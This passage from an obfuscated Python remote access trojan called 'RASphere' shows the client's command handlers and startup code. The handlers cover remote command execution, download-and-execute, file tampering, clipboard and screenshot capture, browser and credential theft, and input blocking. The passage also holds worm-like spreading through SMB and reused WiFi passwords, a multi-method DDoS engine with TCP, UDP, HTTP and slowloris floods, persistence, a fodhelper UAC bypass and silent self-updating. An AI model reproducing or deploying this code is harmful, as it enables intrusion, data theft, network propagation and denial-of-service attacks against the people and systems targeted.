                  **{f"f{i}": getattr(Key, f"f{i}") for i in range(1,13)}}
            def rk(k): k = k.lower(); return SP.get(k, KeyCode.from_char(k))
            a = d.get(_D("_s591"),"")
            if a == _D("_s592"): _s.kc.press(rk(d.get("key","")))
            elif a == _D("_s593"): _s.kc.release(rk(d.get("key","")))
            elif a == _D("_s594"):
                ks = [rk(k) for k in d.get(_D("_s595"),[])]
                for k in ks: _s.kc.press(k)
                for k in reversed(ks): _s.kc.release(k)
            elif a == _D("_s596"): _s.kc.type(d.get("text",""))
            elif a == _D("_s597"):
                scs = {_D("_s598"): ([Key.ctrl, Key.alt], Key.delete), "ctrl_shift_esc": ([Key.ctrl, Key.shift], Key.esc),
                       _D("_s599"): ([Key.alt], Key.tab), "alt_f4": ([Key.alt], Key.f4),
                       _D("_s600"): ([Key.cmd], KeyCode.from_char("d")), "win_r": ([Key.cmd], KeyCode.from_char("r")),
                       _D("_s601"): ([Key.cmd], KeyCode.from_char("e")), "win_l": ([Key.cmd], KeyCode.from_char("l")),
                       _D("_s602"): ([Key.ctrl], KeyCode.from_char("c")), "ctrl_v": ([Key.ctrl], KeyCode.from_char("v")),
                       _D("_s603"): ([Key.ctrl], KeyCode.from_char("x")), "ctrl_z": ([Key.ctrl], KeyCode.from_char("z")),
                       _D("_s604"): ([Key.ctrl], KeyCode.from_char("a")), "ctrl_s": ([Key.ctrl], KeyCode.from_char("s"))}
                sc = scs.get(d.get(_D("_s605"),""))
                if sc:
                    for m in sc[0]: _s.kc.press(m)
                    _s.kc.press(sc[1]); _s.kc.release(sc[1])
                    for m in reversed(sc[0]): _s.kc.release(m)
        except Exception as e: _l.error(f"Key err: {e}")
    @sio.on(_D("_s606"))
    def _ts(): ok = term.start(); sio.emit(_D("_s607"), {"active": ok})
    @sio.on(_D("_s608"))
    def _ti(d): term.write((d or {}).get(_D("_s609"),""))
    @sio.on(_D("_s610"))
    def _tst(): term.stop(); sio.emit(_D("_s611"), {"active": False})
    @sio.on(_D("_s612"))
    def _sm(): mon.start(); sio.emit(_D("_s613"), {"active": True})
    @sio.on(_D("_s614"))
    def _sm2(): mon.stop(); sio.emit(_D("_s615"), {"active": False})
    @sio.on(_D("_s616"))
    def _gp(): sio.emit(_D("_s617"), {"processes": _proc()})
    @sio.on(_D("_s618"))
    def _kp(d): pid = (d or {}).get("pid"); ok, msg = _kill(pid); sio.emit(_D("_s619"), {"ok": ok, "message": msg, "pid": pid})
    @sio.on(_D("_s620"))
    def _cg():
        if HAS[_D("_s621")]:
            try: sio.emit(_D("_s622"), {"text": pyperclip.paste()})
            except Exception as e: sio.emit(_D("_s623"), {"error": str(e)})
        else: sio.emit(_D("_s624"), {"error": "N/A"})
    @sio.on(_D("_s625"))
    def _cs(d):
        if HAS[_D("_s626")]:
            try: pyperclip.copy((d or {}).get(_D("_s627"),"")); sio.emit("clipboard_status", {"ok": True})
            except Exception as e: sio.emit(_D("_s628"), {"ok": False, "error": str(e)})
        else: sio.emit(_D("_s629"), {"ok": False, "error": "N/A"})
    @sio.on(_D("_s630"))
    def _ag(): r = _audio(); sio.emit(_D("_s631"), r or {"error": "N/A"})
    @sio.on(_D("_s632"))
    def _as(d): lv = (d or {}).get(_D("_s633"),50); ok = _avol(int(lv)); sio.emit("audio_status", {"ok": ok, "volume": int(lv)})
    @sio.on(_D("_s634"))
    def _am(): ok = _amute(); r = _audio(); sio.emit(_D("_s635"), r or {"error": "N/A"})
    @sio.on(_D("_s636"))
    def _pmo(): ok = _monoff(); sio.emit(_D("_s637"), {"action": "monitor_off", "ok": ok})
    @sio.on(_D("_s638"))
    def _pl(): ok = _lock(); sio.emit(_D("_s639"), {"action": "lock", "ok": ok})
    @sio.on(_D("_s640"))
    def _ps(): ok = _sleep(); sio.emit(_D("_s641"), {"action": "sleep", "ok": ok})
    @sio.on(_D("_s642"))
    def _wp(d): ok, msg = _wallpaper((d or {}).get(_D("_s643"),"")); sio.emit("cmd_result", {"cmd": "wallpaper", "ok": ok, "message": msg})
    @sio.on(_D("_s644"))
    def _mb(d): ok, msg = _msgbox((d or {}).get(_D("_s645"),"RASphere"), (d or {}).get("text","Hello!")); sio.emit("cmd_result", {"cmd": "msgbox", "ok": ok, "message": msg})
    @sio.on(_D("_s646"))
    def _ou(d): ok, msg = _openurl((d or {}).get("url","")); sio.emit(_D("_s647"), {"cmd": "openurl", "ok": ok, "message": msg})
    @sio.on(_D("_s648"))
    def _tss(): data, fmt = _screenshot(); sio.emit(_D("_s649"), {"data": data, "format": fmt} if data else {"error": fmt})
    @sio.on(_D("_s650"))
    def _geo(): sio.emit(_D("_s651"), _geoip())
    @sio.on(_D("_s652"))
    def _ga(): sio.emit(_D("_s653"), {"apps": _apps()})
    @sio.on(_D("_s654"))
    def _psnd(d): ok, msg = _play_sound((d or {}).get(_D("_s655"),800), (d or {}).get("dur",1)); sio.emit("cmd_result", {"cmd": "sound", "ok": ok, "message": msg})
    @sio.on(_D("_s656"))
    def _sf(d): r = _search_files((d or {}).get(_D("_s657"),"C:\\"), (d or {}).get("pattern","*"), (d or {}).get("max",50)); sio.emit("search_result", {"results": r})
    @sio.on(_D("_s658"))
    def _ec(d): out, rc = _execute_command((d or {}).get(_D("_s659"),"")); sio.emit("execute_result", {"output": out, "code": rc})
    @sio.on(_D("_s660"))
    def _de(d): ok, msg = _download_exec((d or {}).get("url",""), (d or {}).get(_D("_s661"))); sio.emit("cmd_result", {"cmd": "download_exec", "ok": ok, "message": msg})
    @sio.on(_D("_s662"))
    def _ib(d=None): ok, msg = _block_input(True); sio.emit(_D("_s663"), {"cmd": "input_block", "ok": ok, "message": msg})
    @sio.on(_D("_s664"))
    def _iub(d=None): ok, msg = _block_input(False); sio.emit(_D("_s665"), {"cmd": "input_unblock", "ok": ok, "message": msg})
    @sio.on(_D("_s666"))
    def _fl(d): sio.emit(_D("_s667"), _flist((d or {}).get("path","")))
    @sio.on(_D("_s668"))
    def _fdr(d): sio.emit(_D("_s669"), {**_fread((d or {}).get("path",""), (d or {}).get("offset",0)), "path": (d or {}).get("path","")})
    @sio.on(_D("_s670"))
    def _fd(d): ok, msg = _fdel((d or {}).get(_D("_s671"),"")); sio.emit("file_delete_result", {"ok": ok, "message": msg})
    @sio.on(_D("_s672"))
    def _fnf(d): ok, msg = _fmkdir((d or {}).get(_D("_s673"),""), (d or {}).get("name","New Folder")); sio.emit("file_new_folder_result", {"ok": ok, "message": msg})
    @sio.on(_D("_s674"))
    def _fuc(d):
        path = (d or {}).get(_D("_s675"),""); chunk = (d or {}).get("data",""); offset = (d or {}).get("offset",0)
        mode = "wb" if offset == 0 else "ab"
        ok, msg = _fwrite(path, chunk, offset, mode)
        sio.emit(_D("_s676"), {"ok": ok, "message": msg, "path": path})
    @sio.on(_D("_s677"))
    def _ninfo(d=None): sio.emit(_D("_s678"), _network_info())
    @sio.on(_D("_s679"))
    def _bs(d=None):
        _l.info(_D("_s680"))
        result = _browser_steal()
        sio.emit(_D("_s681"), result)
    @sio.on(_D("_s682"))
    def _ch(d=None):
        _l.info(_D("_s683"))
        threading.Thread(target=lambda: (sio.emit(_D("_s684"), _credential_harvest())), daemon=True).start()
    @sio.on(_D("_s685"))
    def _iscan(d=None):
        _l.info(_D("_s686"))
        subnets = (d or {}).get(_D("_s687"), None)
        threading.Thread(target=lambda: (sio.emit(_D("_s688"), _scan_infectable_targets(subnets))), daemon=True).start()
    @sio.on(_D("_s689"))
    def _istart(d=None):
        d = d or {}
        target_ip = d.get(_D("_s690"), "")
        username = d.get(_D("_s691"), "")
        password = d.get(_D("_s692"), "")
        method = d.get(_D("_s693"), "auto")
        _l.info(f"Infection requested: {target_ip} with {username}")
        def _do_infect():
            result = _infect_target(target_ip, username, password, method)
            sio.emit(_D("_s694"), result)
        threading.Thread(target=_do_infect, daemon=True).start()
    @sio.on(_D("_s695"))
    def _itest(d=None):
        d = d or {}
        target_ip = d.get(_D("_s696"), "")
        username = d.get(_D("_s697"), "")
        password = d.get(_D("_s698"), "")
        def _do_test():
            ok = _test_smb_credentials(target_ip, username, password)
            sio.emit(_D("_s699"), {"target": target_ip, "username": username, "success": ok})
        threading.Thread(target=_do_test, daemon=True).start()
    @sio.on(_D("_s700"))
    def _winfect(d=None):
        d = d or {}
        ssid = d.get(_D("_s701"), "")
        password = d.get(_D("_s702"), "")
        if not ssid or not password:
            sio.emit(_D("_s703"), {"error": "SSID and password required"})
            return
        _l.info(f"WiFi neighbor infection: {ssid}")
        def _do_wifi():
            result = _wifi_connect_and_infect(ssid, password)
            sio.emit(_D("_s704"), result)
        threading.Thread(target=_do_wifi, daemon=True).start()
    @sio.on(_D("_s705"))
    def _iauto(d=None):
        ""_D("_s706")""
        _l.info(_D("_s707"))
        def _do_auto():
            wifi_data = _wifi_passwords()
            scan_data = _scan_infectable_targets()
            creds = _build_credential_list(wifi_data)
            targets = scan_data.get(_D("_s708"), [])
            sio.emit(_D("_s709"), scan_data)
            sio.emit(_D("_s710"), {"phase": "trying_credentials", "total": len(targets), "creds": len(creds)})
            successful = _auto_try_credentials(targets, creds)
            sio.emit(_D("_s711"), {"successful": successful, "targets_scanned": len(targets), "credentials_tried": len(creds)})
            for entry in successful:
                result = _infect_target(entry[_D("_s712")], entry["username"], entry["password"], "auto")
                sio.emit(_D("_s713"), result)
        threading.Thread(target=_do_auto, daemon=True).start()
    @sio.on(_D("_s714"))
    def _ddos_start(d=None):
        d = d or {}
        target = d.get(_D("_s715"), "")
        port = d.get(_D("_s716"), 80)
        threads = d.get(_D("_s717"), 50)
        pkt_size = d.get(_D("_s718"), 1024)
        method = d.get(_D("_s719"), "tcp")
        if not target:
            sio.emit(_D("_s720"), {"active": False, "error": "No target specified"})
            return
        _l.info(f"DDoS start: {method} -> {target}:{port} ({threads} threads)")
        ddos.start(target, port=port, threads=threads, packet_size=pkt_size, method=method)
    @sio.on(_D("_s721"))
    def _ddos_stop(d=None):
        ddos.stop()
    @sio.on(_D("_s722"))
    def _ks(d=None):
        _l.warning(_D("_s723")); sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop(); ddos.stop(); sio.disconnect(); os._exit(0)
class DdosEngine:
    ""_D("_s724")""
    def __init__(self, sio):
        self.r = False; self.sio = sio
        self.threads = []; self.stats = {_D("_s725"): 0, "data_bytes": 0, "start_time": 0}
        self._lock = threading.Lock(); self._target = ""; self._port = 80
    def start(self, target, port=80, threads=50, packet_size=1024, method="tcp"):
        if self.r: self.stop()
        threads = max(1, min(500, threads))
        packet_size = max(64, min(65500, packet_size))
        port = max(1, min(65535, port))
        self.r = True
        self._target = target; self._port = port
        self.stats = {_D("_s726"): 0, "data_bytes": 0, "start_time": time.time()}
        _l.info(f"DDoS starting: {method} flood -> {target}:{port} ({threads} threads)")
        try:
            self._target_ip = socket.gethostbyname(target)
        except:
            self._target_ip = target
        for i in range(threads):
            t = threading.Thread(target=self._worker, args=(method, packet_size, i), daemon=True)
            t.start()
            self.threads.append(t)
        threading.Thread(target=self._stats_reporter, daemon=True).start()
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s727"), {"active": True, "target": f"{target}:{port}", "method": method, "threads": threads})
    def stop(self):
        self.r = False
        for t in self.threads:
            if t.is_alive():
                t.join(timeout=1)
        self.threads = []
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s728"), {"active": False})
        _l.info(_D("_s729"))
    def _worker(self, method, pkt_size, tid):
        ""_D("_s730")""
        payload = os.urandom(pkt_size) if method != _D("_s731") else None
        if method == "tcp":
            while self.r:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect_ex((self._target_ip, self._port))
                    s.send(payload[:min(pkt_size, 65536)])
                    s.close()
                    with self._lock:
                        self.stats[_D("_s732")] += 1
                        self.stats[_D("_s733")] += pkt_size
                except:
                    with self._lock:
                        self.stats[_D("_s734")] += 1
        elif method == "udp":
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while self.r:
                    try:
                        s.sendto(payload[:min(pkt_size, 65507)], (self._target_ip, self._port))
                        with self._lock:
                            self.stats[_D("_s735")] += 1
                            self.stats[_D("_s736")] += pkt_size
                    except:
                        with self._lock:
                            self.stats[_D("_s737")] += 1
                s.close()
            except:
                pass
        elif method == _D("_s738"):
            url = f"{self._target}:{self._port}" if self._port != 80 and self._port != 443 else self._target
            proto = _D("_s739") if self._port == 443 else "http"
            full_url = f"{proto}://{url}/"
            while self.r:
                try:
                    r = urllib.request.urlopen(full_url, timeout=3)
                    data = r.read()
                    with self._lock:
                        self.stats[_D("_s740")] += 1
                        self.stats[_D("_s741")] += len(data)
                except:
                    with self._lock:
                        self.stats[_D("_s742")] += 1
        elif method == _D("_s743"):
            sockets_held = []
            try:
                while self.r:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(3)
                        s.connect((self._target_ip, self._port))
                        s.send(f"GET / HTTP/1.1\r\nHost: {self._target}\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\n".encode())
                        sockets_held.append(s)
                        with self._lock:
                            self.stats[_D("_s744")] += 1
                        if len(sockets_held) > 200:
                            old = sockets_held.pop(0)
                            try: old.close()
                            except: pass
                        for _ in range(50):
                            if not self.r: return
                            time.sleep(0.1)
                    except:
                        pass
            finally:
                for s in sockets_held:
                    try: s.close()
                    except: pass
    def _stats_reporter(self):
        ""_D("_s745")""
        while self.r:
            time.sleep(2)
            if not self.r: break
            with self._lock:
                elapsed = max(0.001, time.time() - self.stats[_D("_s746")])
                pps = int(self.stats[_D("_s747")] / elapsed)
                data_mb = self.stats[_D("_s748")] / (1024 * 1024)
                if self.sio and self.sio.connected:
                    self.sio.emit(_D("_s749"), {
                        _D("_s750"): {
                            _D("_s751"): self.stats["packets"],
                            "pps": pps,
                            _D("_s752"): round(data_mb, 2),
                            _D("_s753"): int(elapsed)
                        }
                    })
def main():
    p = argparse.ArgumentParser(description=_D("_s754"))
    p.add_argument(_D("_s755"), default=None, help=f"Server URL (default: {_SERVER})")
    p.add_argument(_D("_s756"), default=None, help=f"Client secret (default: ***)")
    p.add_argument(_D("_s757"), default=None, help="Client ID (default: auto)")
    p.add_argument(_D("_s758"), type=int, default=None, help=f"Reconnect delay (default: {_RECON}s)")
    p.add_argument(_D("_s759"), action="store_true", help="Install persistence")
    p.add_argument(_D("_s760"), action="store_true", help="Remove persistence")
    p.add_argument(_D("_s761"), action="store_true", help="Skip auto-persistence")
    p.add_argument(_D("_s762"), action="store_true", help=argparse.SUPPRESS)
    p.add_argument(_D("_s763"), action="store_true", help="Skip UAC bypass on startup")
    args = p.parse_args()
    url = args.server or _SERVER; secret = args.secret or _SECRET
    rec = args.reconnect if args.reconnect is not None else _RECON
    cid = args.id or _CLIENT_ID
    if args.uninstall:
        if _up(): print(_D("_s764"))
        else: print(_D("_s765"))
        return
    if args.install:
        if not url or not secret: print(_D("_s766")); sys.exit(1)
        if _ip(url, secret, rec, cid): print(_D("_s767"))
        else: print(_D("_s768"))
    if sys.platform == _D("_s769") and not getattr(args, "no_elevate", False) and not getattr(args, "elevated", False):
        if not _is_admin():
            _l.info(_D("_s770"))
            _fodhelper_uac_bypass(args)
            print(_D("_s771"))
        else:
            _l.info(_D("_s772"))
    if getattr(args, _D("_s773"), False):
        _l.info(_D("_s774"))
        _cleanup_uac_registry()
    if not args.no_persist and not args.uninstall:
        try:
            if url and secret:
                ok = _ip(url, secret, rec, cid)
                if ok: print(_D("_s775"))
                else: print(_D("_s776"))
        except Exception as e: print(f"[!] Auto-persist error: {e}")
    if not url: print(_D("_s777")); sys.exit(1)
    if not secret: print(_D("_s778")); sys.exit(1)
    _s.url = url.rstrip("/"); _s.secret = secret
    _s.cid = cid or f"{socket.gethostname()}-{os.urandom(3).hex()}"
    _l.info(f"RASphere Client | ID: {_s.cid} | Server: {_s.url}")
    sio = sio_lib.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=rec,
                          reconnection_delay_max=30, _l=False, engineio_logger=False)
    _sh(sio); _s.sio = sio
    threading.Thread(target=_keepalive_pinger, args=(_s.url,), daemon=True).start()
    update_checked = False
    current_delay = rec  
    while True:
        try:
            _l.info(f"Connecting to {_s.url}...")
            sio.connect(_s.url, wait_timeout=10)
            _l.info(_D("_s779"))
            current_delay = rec
            if not update_checked:
                new_ver, dl_url = _check_for_update(_s.url)
                update_checked = True
                if new_ver and dl_url:
                    _l.info(f"New version {new_ver} available, applying update...")
                    ok = _download_and_install(dl_url, new_ver)
                    if ok:
                        _l.info(_D("_s780"))
                        sio.disconnect()
                        os._exit(0)
            sio.wait()
        except KeyboardInterrupt: _l.info(_D("_s781")); break
        except Exception as e:
            _l.error(f"Connection error: {e}")
            if not rec: break
            _l.info(f"Reconnecting in {current_delay}s...")
            time.sleep(current_delay)
            current_delay = min(current_delay * 2, _RECON_MAX)
    sio.disconnect(); _l.info(_D("_s782"))
if __name__ == _D("_s783"): main()
